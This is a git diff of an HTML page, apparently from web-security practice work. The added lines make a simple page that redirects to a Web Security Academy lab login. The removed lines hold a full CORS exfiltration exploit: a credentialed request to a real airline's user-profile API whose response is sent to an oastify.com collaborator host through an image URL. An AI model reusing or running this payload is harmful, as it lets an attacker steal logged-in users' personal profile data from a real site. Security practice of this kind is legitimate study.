@@ -1,21 +1,18 @@
+<!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Test</title>
+    <title>Redirecting...</title>
+    <script>
+        function redirectToLogin() {
+            // Redirect to the actual login page
+            window.location.href = 'https://0a76006804cab51f81b5c5d400c40045.web-security-academy.net/login';
+        }
+
+        // Redirect after a short delay
+        setTimeout(redirectToLogin, 2000); // Adjust the delay as needed
+    </script>
 </head>
 <body>
-    <script type="text/javascript">
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'http://www.aeromexico.com/api/v4/profile/user-profile', true);
-        xhr.withCredentials = true;
-        xhr.setRequestHeader('Origin', 'w415pq71zl77ktxfqjearasrqiw9k5bt0.oastify.com');
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                var data = xhr.responseText;
-                var img = new Image();
-                img.src = 'http://w415pq71zl77ktxfqjearasrqiw9k5bt0.oastify.com/log?data=' + encodeURIComponent(data);
-            }
-        };
-        xhr.send();
-    </script>
+    <h1>Please wait, you are being redirected to the login page...</h1>
 </body>
 </html>
